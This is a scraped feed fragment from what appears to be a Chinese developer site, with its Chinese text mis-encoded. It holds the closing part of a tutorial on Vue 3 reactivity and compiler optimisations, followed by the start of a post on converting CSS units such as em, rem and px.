<span class="hljs-comment">// ç¼–è¯‘åä»£ç </span>
<span class="hljs-keyword">import</span> { createElementVNode <span class="hljs-keyword">as</span> _createElementVNode } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>

<span class="hljs-keyword">const</span> _hoisted_1 = <span class="hljs-comment">/*#__PURE__*/</span><span class="hljs-title function_">_createElementVNode</span>(
  <span class="hljs-string">"span"</span>, 
  <span class="hljs-literal">null</span>, 
  <span class="hljs-string">"é™æ€å†…å®¹"</span>,
  -<span class="hljs-number">1</span> <span class="hljs-comment">/* HOISTED */</span>
)

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">_ctx, _cache</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">_createElementVNode</span>(
    <span class="hljs-string">"div"</span>, 
    <span class="hljs-literal">null</span>, [
      _hoisted_1,  <span class="hljs-comment">// é™æ€èŠ‚ç‚¹æå‡</span>
      <span class="hljs-title function_">_createElementVNode</span>(
        <span class="hljs-string">"span"</span>, 
        <span class="hljs-literal">null</span>, 
        <span class="hljs-title function_">_toDisplayString</span>(_ctx.<span class="hljs-property">dynamic</span>),
        <span class="hljs-number">1</span> <span class="hljs-comment">/* TEXT */</span>
      ),
      <span class="hljs-title function_">_createElementVNode</span>(
        <span class="hljs-string">"div"</span>, 
        {
          <span class="hljs-attr">class</span>: <span class="hljs-title function_">normalizeClass</span>(_ctx.<span class="hljs-property">className</span>)
        },
        <span class="hljs-literal">null</span>,
        <span class="hljs-number">2</span> <span class="hljs-comment">/* CLASS */</span>
      )
    ],
    <span class="hljs-number">0</span> <span class="hljs-comment">/* æ— æ ‡å¿— */</span>
  )
}

<span class="hljs-comment">// Patch Flags ç±»å‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">PatchFlags</span> = {
  <span class="hljs-attr">TEXT</span>: <span class="hljs-number">1</span>,        <span class="hljs-comment">// åŠ¨æ€æ–‡æœ¬</span>
  <span class="hljs-attr">CLASS</span>: <span class="hljs-number">2</span>,       <span class="hljs-comment">// åŠ¨æ€ class</span>
  <span class="hljs-attr">STYLE</span>: <span class="hljs-number">4</span>,       <span class="hljs-comment">// åŠ¨æ€ style</span>
  <span class="hljs-attr">PROPS</span>: <span class="hljs-number">8</span>,       <span class="hljs-comment">// åŠ¨æ€ props</span>
  <span class="hljs-attr">FULL_PROPS</span>: <span class="hljs-number">16</span>, <span class="hljs-comment">// åŠ¨æ€ keyï¼Œéœ€è¦å…¨é‡ diff</span>
  <span class="hljs-attr">HYDRATE_EVENTS</span>: <span class="hljs-number">32</span>,
  <span class="hljs-attr">STABLE_FRAGMENT</span>: <span class="hljs-number">64</span>,
  <span class="hljs-attr">KEYED_FRAGMENT</span>: <span class="hljs-number">128</span>,
  <span class="hljs-attr">UNKEYED_FRAGMENT</span>: <span class="hljs-number">256</span>,
  <span class="hljs-attr">NEED_PATCH</span>: <span class="hljs-number">512</span>,
  <span class="hljs-attr">DYNAMIC_SLOTS</span>: <span class="hljs-number">1024</span>,
  <span class="hljs-attr">HOISTED</span>: -<span class="hljs-number">1</span>,    <span class="hljs-comment">// é™æ€æå‡</span>
  <span class="hljs-attr">BAIL</span>: -<span class="hljs-number">2</span>        <span class="hljs-comment">// ç‰¹æ®Šæƒ…å†µ</span>
}
</code></pre>
<h3 data-id="heading-13">9.Â <strong>Tree Flatteningï¼ˆæ ‘ç»“æ„æ‰“å¹³ï¼‰</strong></h3>
<pre><code class="hljs language-javascri" lang="javascri">// ä¼˜åŒ–å‰çš„ VNode ç»“æ„
{
  type: 'div',
  children: [
    { type: 'p', children: 'é™æ€å†…å®¹' },
    { type: 'span', children: [/* åŠ¨æ€å†…å®¹ */] },
    { type: 'div', children: [/* æ›´å¤šåµŒå¥— */] }
  ]
}

// ä¼˜åŒ–åçš„ VNode ç»“æ„
{
  type: 'div',
  children: [
    { type: 'p', children: 'é™æ€å†…å®¹' },
    // åŠ¨æ€èŠ‚ç‚¹è¢«æå–åˆ°å•ç‹¬çš„æ•°ç»„ä¸­
  ],
  // åŠ¨æ€å­èŠ‚ç‚¹è¢«æ”¶é›†åˆ°è¿™é‡Œ
  dynamicChildren: [
    { type: 'span', patchFlag: 1 },
    { type: 'div', patchFlag: 2 }
  ]
}

// æ›´æ–°æ—¶åª diff dynamicChildrenï¼Œè·³è¿‡é™æ€èŠ‚ç‚¹
</code></pre>
<h2 data-id="heading-14">ğŸ“ŠÂ <strong>å“åº”å¼æ€§èƒ½ä¼˜åŒ–</strong></h2>
<h3 data-id="heading-15">10.Â <strong>ä¾èµ–æ”¶é›†ä¼˜åŒ–</strong></h3>
<pre><code class="hljs language-javascr" lang="javascr">// 1. æƒ°æ€§ä¾èµ–æ”¶é›†
let shouldTrack = true

function pauseTracking() {
  shouldTrack = false
}

function enableTracking() {
  shouldTrack = true
}

function track(target, key) {
  if (!shouldTrack || !activeEffect) return
  // ... åŸæœ‰çš„ track é€»è¾‘
}

// 2. æ‰¹é‡æ›´æ–°
let isFlushing = false
let queue = []

function queueJob(job) {
  if (!queue.includes(job)) {
    queue.push(job)
  }
  
  // ä¸‹ä¸€ä¸ª tick æ‰§è¡Œæ‰€æœ‰æ›´æ–°
  if (!isFlushing) {
    isFlushing = true
    Promise.resolve().then(() =&gt; {
      try {
        queue.forEach(job =&gt; job())
      } finally {
        queue.length = 0
        isFlushing = false
      }
    })
  }
}

// 3. å“åº”å¼å±‚çº§çš„ä¼˜åŒ–
const RAW = '__v_raw'  // åŸå§‹å¯¹è±¡æ ‡è®°

function toRaw(observed) {
  const raw = observed &amp;&amp; observed[RAW]
  return raw ? toRaw(raw) : observed
}

// é¿å…æ·±å±‚ä»£ç†çš„é‡å¤åˆ›å»º
const proxyMap = new WeakMap()

function createReactiveObject(target) {
  // æ£€æŸ¥æ˜¯å¦å·²ç»æœ‰ä»£ç†
  const existingProxy = proxyMap.get(target)
  if (existingProxy) {
    return existingProxy
  }
  
  const proxy = new Proxy(target, handlers)
  proxyMap.set(target, proxy)
  return proxy
}
</code></pre>
<h2 data-id="heading-16">ğŸ”„Â <strong>å“åº”å¼ç³»ç»Ÿçš„è°ƒåº¦æœºåˆ¶</strong></h2>
<h3 data-id="heading-17">11.Â <strong>æ›´æ–°é˜Ÿåˆ—ä¸è°ƒåº¦å™¨</strong></h3>
<pre><code class="hljs language-javascri" lang="javascri">// å“åº”å¼ä»»åŠ¡è°ƒåº¦å™¨
const queue = []
let isFlushing = false
const resolvedPromise = Promise.resolve()

function queueFlush() {
  if (!isFlushing &amp;&amp; !queue.length) {
    isFlushing = true
    resolvedPromise.then(flushJobs)
  }
}

function flushJobs() {
  try {
    // å…ˆæ‰§è¡Œæ‰€æœ‰å‰ç½®ä»»åŠ¡
    for (let i = 0; i &lt; queue.length; i++) {
      const job = queue[i]
      if (job &amp;&amp; job.active !== false) {
        if (job.pre) {
          job()
        }
      }
    }
    
    // æ‰§è¡Œç»„ä»¶æ›´æ–°
    for (let i = 0; i &lt; queue.length; i++) {
      const job = queue[i]
      if (job &amp;&amp; job.active !== false) {
        if (!job.pre) {
          job()
        }
      }
    }
  } finally {
    // æ¸…ç©ºé˜Ÿåˆ—
    queue.length = 0
    isFlushing = false
    
    // æ‰§è¡Œåç½®ä»»åŠ¡
    // flushPostFlushCbs()
  }
}

// watch çš„è°ƒåº¦å®ç°
function watch(source, cb, options = {}) {
  const { flush = 'sync' } = options
  
  let scheduler
  if (flush === 'sync') {
    scheduler = job =&gt; job()  // åŒæ­¥æ‰§è¡Œ
  } else if (flush === 'pre') {
    scheduler = job =&gt; queueJob(job)  // ç»„ä»¶æ›´æ–°å‰
  } else { // 'post'
    scheduler = job =&gt; queuePostFlushCb(job)  // ç»„ä»¶æ›´æ–°å
  }
  
  const effect = new ReactiveEffect(getter, scheduler)
  // ...
}
</code></pre>
<h2 data-id="heading-18">ğŸ¯Â <strong>å“åº”å¼ç³»ç»Ÿçš„è¾¹ç•Œæƒ…å†µ</strong></h2>
<h3 data-id="heading-19">12.Â <strong>å¾ªç¯å¼•ç”¨å¤„ç†</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨ WeakMap é¿å…å¾ªç¯å¼•ç”¨</span>
<span class="hljs-keyword">const</span> reactiveMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>()

<span class="hljs-keyword">function</span> <span class="hljs-title function_">reactive</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-comment">// å¦‚æœå·²ç»ä»£ç†è¿‡ï¼Œç›´æ¥è¿”å›</span>
  <span class="hljs-keyword">const</span> existing = reactiveMap.<span class="hljs-title function_">get</span>(obj)
  <span class="hljs-keyword">if</span> (existing) <span class="hljs-keyword">return</span> existing
  
  <span class="hljs-comment">// å¦‚æœå¯¹è±¡æœ‰å¾ªç¯å¼•ç”¨æ ‡è®°ï¼Œè·³è¿‡</span>
  <span class="hljs-keyword">if</span> (obj &amp;&amp; obj.<span class="hljs-property">__v_skip</span>) {
    <span class="hljs-keyword">return</span> obj
  }
  
  <span class="hljs-keyword">const</span> proxy = <span class="hljs-title function_">createReactiveObject</span>(obj)
  reactiveMap.<span class="hljs-title function_">set</span>(obj, proxy)
  <span class="hljs-keyword">return</span> proxy
}

<span class="hljs-comment">// æ ‡è®°è·³è¿‡å“åº”å¼çš„å¯¹è±¡</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">markRaw</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(value, <span class="hljs-string">'__v_skip'</span>, {
    <span class="hljs-attr">value</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>
  })
  <span class="hljs-keyword">return</span> value
}
</code></pre>
<h3 data-id="heading-20">13.Â <strong>å¤§å¯¹è±¡çš„æ€§èƒ½ä¼˜åŒ–</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æµ…å±‚å“åº”å¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">shallowReactive</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">createReactiveObject</span>(target, <span class="hljs-literal">true</span>)
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createReactiveObject</span>(<span class="hljs-params">target, shallow = <span class="hljs-literal">false</span></span>) {
  <span class="hljs-keyword">const</span> handlers = shallow ? shallowHandlers : baseHandlers
  <span class="hljs-comment">// ...</span>
}

<span class="hljs-comment">// æµ…å±‚ handlers</span>
<span class="hljs-keyword">const</span> shallowHandlers = {
  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
    <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver)
    <span class="hljs-title function_">track</span>(target, key)
    
    <span class="hljs-comment">// å…³é”®åŒºåˆ«ï¼šä¸é€’å½’å¤„ç†åµŒå¥—å¯¹è±¡</span>
    <span class="hljs-keyword">return</span> result  <span class="hljs-comment">// ç›´æ¥è¿”å›ï¼Œä¸å†åŒ…è£…</span>
  },
  <span class="hljs-comment">// ... å…¶ä»– handlers</span>
}

<span class="hljs-comment">// æƒ°æ€§å“åº”å¼ï¼šåªåœ¨å®é™…è®¿é—®æ—¶è¿›è¡Œä»£ç†</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">lazyReactive</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">let</span> proxyCache = <span class="hljs-literal">null</span>
  
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {
    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
      <span class="hljs-keyword">if</span> (key === <span class="hljs-string">'__v_raw'</span>) <span class="hljs-keyword">return</span> target
      
      <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰åˆ›å»ºçœŸæ­£çš„å“åº”å¼ä»£ç†</span>
      <span class="hljs-keyword">if</span> (!proxyCache) {
        proxyCache = <span class="hljs-title function_">reactive</span>(target)
      }
      
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(proxyCache, key, receiver)
    },
    <span class="hljs-comment">// ... å…¶ä»–æ“ä½œ</span>
  })
}
</code></pre>
<h2 data-id="heading-21">ğŸ“ˆÂ <strong>å“åº”å¼ç³»ç»Ÿçš„ç›‘æ§ä¸è°ƒè¯•</strong></h2>
<h3 data-id="heading-22">14.Â <strong>å¼€å‘å·¥å…·é›†æˆ</strong></h3>
<pre><code class="hljs language-javascri" lang="javascri">// å“åº”å¼è°ƒè¯•ä¿¡æ¯
function setupReactivityDebug() {
  // 1. è·Ÿè¸ªä¾èµ–å…³ç³»
  const dependencyGraph = new Map()
  
  // 2. æ€§èƒ½ç›‘æ§
  const performance = {
    trackTime: 0,
    triggerTime: 0,
    effectCount: 0
  }
  
  // 3. å†…å­˜æ³„æ¼æ£€æµ‹
  const effectRegistry = new WeakSet()
  
  return {
    // æš´éœ²ç»™ Vue DevTools çš„æ¥å£
    inspect(target) {
      const depsMap = targetMap.get(target)
      return {
        deps: depsMap ? Array.from(depsMap.entries()) : [],
        rawValue: toRaw(target),
        isReactive: isReactive(target)
      }
    },
    
    // æ€§èƒ½åˆ†æ
    getPerformance() {
      return { ...performance }
    },
    
    // æ¸…ç†æ‰€æœ‰ effect
    disposeAll() {
      // æ¸…ç†é€»è¾‘
    }
  }
}

// Vue DevTools ä¸­çš„å“åº”å¼é¢æ¿å¯ä»¥çœ‹åˆ°ï¼š
// 1. å“åº”å¼å¯¹è±¡çš„ä¾èµ–å›¾
// 2. æ¯ä¸ªå±æ€§çš„ä¾èµ–åˆ—è¡¨
// 3. Effect çš„æ‰§è¡Œå†å²
// 4. æ€§èƒ½åˆ†ææ•°æ®
</code></pre>
<h2 data-id="heading-23">ğŸ“Â <strong>æ€»ç»“ï¼šVue å“åº”å¼ç³»ç»Ÿçš„æ¼”è¿›</strong></h2>
<h3 data-id="heading-24"><strong>Vue 2 åˆ° Vue 3 çš„å…³é”®æ”¹è¿›</strong>ï¼š</h3>
<ol>
<li><strong>åº•å±‚å®ç°</strong>ï¼š<code>Object.defineProperty</code>Â â†’Â <code>Proxy</code></li>
<li><strong>æ€§èƒ½</strong>ï¼šé€’å½’åˆå§‹åŒ– â†’ æƒ°æ€§ä»£ç†</li>
<li><strong>åŠŸèƒ½</strong>ï¼šä¸æ”¯æŒæ–°å¢å±æ€§ â†’ å®Œå…¨æ”¯æŒ</li>
<li><strong>ç±»å‹æ”¯æŒ</strong>ï¼šæœ‰é™çš„ç±»å‹æ¨æ–­ â†’ å®Œæ•´çš„ TypeScript æ”¯æŒ</li>
<li><strong>é›†åˆç±»å‹</strong>ï¼šä¸æ”¯æŒ Map/Set â†’ å®Œæ•´æ”¯æŒ</li>
</ol>
<h3 data-id="heading-25"><strong>æ ¸å¿ƒåˆ›æ–°ç‚¹</strong>ï¼š</h3>
<ul>
<li><strong>ç¼–è¯‘æ—¶ä¼˜åŒ–</strong>ï¼šPatch Flagsã€Tree Flattening</li>
<li><strong>ä¾èµ–æ”¶é›†ç²’åº¦</strong>ï¼šç»„ä»¶çº§ â†’ å±æ€§çº§</li>
<li><strong>æ›´æ–°è°ƒåº¦</strong>ï¼šåŒæ­¥æ›´æ–° â†’ å¼‚æ­¥æ‰¹é‡æ›´æ–°</li>
<li><strong>å†…å­˜ç®¡ç†</strong>ï¼šWeakMap è‡ªåŠ¨åƒåœ¾å›æ”¶</li>
</ul>
<h3 data-id="heading-26"><strong>è®¾è®¡å“²å­¦</strong>ï¼š</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue å“åº”å¼ç³»ç»Ÿçš„è®¾è®¡ç›®æ ‡ï¼š</span>
<span class="hljs-number">1.</span> é€æ˜æ€§ï¼šå¼€å‘è€…æ— éœ€æ‰‹åŠ¨ç®¡ç†ä¾èµ–
<span class="hljs-number">2.</span> é«˜æ•ˆæ€§ï¼šæœ€å°åŒ–çš„æ›´æ–°èŒƒå›´
<span class="hljs-number">3.</span> ä¸€è‡´æ€§ï¼šåŒæ­¥çš„ç¼–ç¨‹æ¨¡å‹ï¼Œå¼‚æ­¥çš„æ›´æ–°æ‰§è¡Œ
<span class="hljs-number">4.</span> æ¸è¿›æ€§ï¼šä»ç®€å•åˆ°å¤æ‚çš„å¹³æ»‘è¿‡æ¸¡
<span class="hljs-number">5.</span> å¯è°ƒè¯•æ€§ï¼šå®Œæ•´çš„å¼€å‘å·¥å…·æ”¯æŒ

<span class="hljs-comment">// è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ Vue çš„å“åº”å¼ç³»ç»Ÿæ—¢å¼ºå¤§åˆæ˜“ç”¨</span>
</code></pre>
<p>Vue çš„å“åº”å¼ç³»ç»Ÿæ˜¯å…¶æ¡†æ¶çš„æ ¸å¿ƒï¼Œå®ƒå·§å¦™åœ°å°†<strong>å£°æ˜å¼ç¼–ç¨‹</strong>ä¸<strong>é«˜æ•ˆçš„æ›´æ–°æœºåˆ¶</strong>ç»“åˆèµ·æ¥ï¼Œä¸ºå¼€å‘è€…æä¾›äº†æä½³çš„å¼€å‘ä½“éªŒï¼ŒåŒæ—¶ä¿è¯äº†ä¼˜ç§€çš„è¿è¡Œæ—¶æ€§èƒ½ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[em,rem,px,rpxå•ä½æ¢ç®—ï¼Œä½ å¼„æ‡‚äº†å—ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592759140038000681</link>    <guid>https://juejin.cn/post/7592759140038000681</guid>    <pubDate>2026-01-08T09:01:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759140038000681" data-draft-id="7592555965793124358" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="em,rem,px,rpxå•ä½æ¢ç®—ï¼Œä½ å¼„æ‡‚äº†å—ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T09:01:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ€ªå¯çˆ±çš„åœ°çƒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/4387527339288932"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            em,rem,px,rpxå•ä½æ¢ç®—ï¼Œä½ å¼„æ‡‚äº†å—ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4387527339288932/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ€ªå¯çˆ±çš„åœ°çƒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:01:33.000Z" title="Thu Jan 08 2026 09:01:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€åœ¨ç½‘é¡µä¸Šé¢çš„æ¢ç®—</h2>
<h4 data-id="heading-1">emä¸remä¸pxçš„æ¢ç®—</h4>
<h3 data-id="heading-2">emå…¬å¼</h3>
<pre><code class="hljs language-js" lang="js">em Ã— çˆ¶å…ƒç´ å­—ä½“å¤§å° = px
</code></pre>
<pre><code class="hljs language-js" lang="js">&lt;!-- çˆ¶å…ƒç´ ï¼šå­—ä½“ 20px --&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"font-size: 20px"</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- å­å…ƒç´ ï¼špadding 1.25em --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"padding: 1.25em"</span>&gt;</span>
    å†…å®¹
  <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
</code></pre>
<p>è®¡ç®—ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-number">1.</span>25em Ã— 20px = 25px
æ‰€ä»¥ padding = 25px
</code></pre>
<h6 data-id="heading-3">åµŒå¥—æƒ…å†µï¼ˆå¤šå±‚çˆ¶å…ƒç´ ï¼‰</h6>
<pre><code class="hljs language-js" lang="js">&lt;div style=<span class="hljs-string">"font-size: 20px"</span>&gt;        &lt;!-- æœ€å¤–å±‚çˆ¶å…ƒç´  --&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"font-size: 18px"</span>&gt;</span>      <span class="hljs-comment">&lt;!-- ä¸­é—´çˆ¶å…ƒç´  --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"padding: 1.25em"</span>&gt;</span>      <span class="hljs-comment">&lt;!-- å­å…ƒç´  --&gt;</span>
      å†…å®¹
    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/div&gt;
</code></pre>
<ul>
<li>å­å…ƒç´ çš„Â 1.25emÂ ç›¸å¯¹äºç›´æ¥çˆ¶å…ƒç´ ï¼ˆä¸­é—´ divï¼‰</li>
<li>1.25em Ã— 18px = 22.5px</li>
</ul>
<h3 data-id="heading-4">remåŸºç¡€å…¬å¼</h3>
<pre><code class="hljs language-js" lang="js">remå€¼*æ ¹å…ƒç´ å­—ä½“å¤§å°=pxå€¼
</code></pre>
<h6 data-id="heading-5">é»˜è®¤æƒ…å†µ</h6>
<p>æµè§ˆå™¨æ ¹å…ƒç´ <code>ï¼ˆ&lt;html&gt;ï¼‰</code>çš„é»˜è®¤å­—ä½“å¤§å°çš„16pxã€‚</p>
<p>æ‰€ä»¥</p>
<pre><code class="hljs language-js" lang="js">1rem=16px
</code></pre>
<h6 data-id="heading-6">å¸¸è§æ¢ç®—</h6>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa57f34bf08d4cee91b904cdc24ed708~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCq5Y-v54ix55qE5Zyw55CD5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467693&amp;x-signature=6B4%2B9uOF2eOaMlkC2DsH6V4W%2FDg%3D" alt="image.png" loading="lazy"/></p>
<h6 data-id="heading-7">å¿«é€Ÿæ¢ç®—æ–¹æ³•</h6>
<pre><code class="hljs language-js" lang="js">rem å€¼ Ã— <span class="hljs-number">16</span> = px å€¼
</code></pre>
<p>æˆ–è€…</p>
<pre><code class="hljs language-js" lang="js">px å€¼ Ã· <span class="hljs-number">16</span> = rem å€¼
</code></pre>
<h6 data-id="heading-8">å®é™…åº”ç”¨</h6>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/* UnoCSS ç±»å */</span>
leading-<span class="hljs-number">5</span>        â†’ line-<span class="hljs-attr">height</span>: <span class="hljs-number">1.</span>25rem â†’ 20px
p-<span class="hljs-number">4</span>              â†’ <span class="hljs-attr">padding</span>: 1rem â†’ 16px
